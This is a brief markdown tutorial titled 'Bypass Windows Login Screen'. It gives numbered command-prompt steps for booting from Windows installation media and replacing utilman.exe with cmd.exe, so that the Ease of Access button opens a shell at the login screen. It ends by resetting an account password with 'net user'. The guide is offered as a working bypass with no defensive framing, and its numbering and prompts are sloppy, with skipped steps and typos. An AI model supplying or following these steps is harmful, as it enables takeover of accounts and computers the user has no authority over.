<h1 align="center">Bypass Windows Login Screen</h1>


## Requirement

A Computer, Bootable USB for Windows 10

1. Restart and hit Shift + 10

2. 
X: \Sources>

Input
```bash
wmic logicaldisk get name
```

Output:
    Name
    C:
    D:
    E:
    X:


3. 
X: \Sources>

Input
```bash
C:
#the directory which comtains your system files
```


4.
C: \>

Input
```bash
dir
```

Output:
Volume in drive C is System Reserved
Volume Serial Number is 56E1-426F

Directory of C:\
    File Not Found


5. 
E: \>

Input
```bash
D:
```


6. 
D: \>

Input
```bash
cd Windows
```


8. 
D: \Windows>

Input
```bash
cd System32
```


10. 
D: \Windows\System32>

Input
```bash
ren utilman.exe utilman2.exe
```


11. 
D: \Windows\System32>

Input
```bash
copy cmd.exe utilman.exe
```


12. Click Ease of Access - cmd will open

13. net user may password
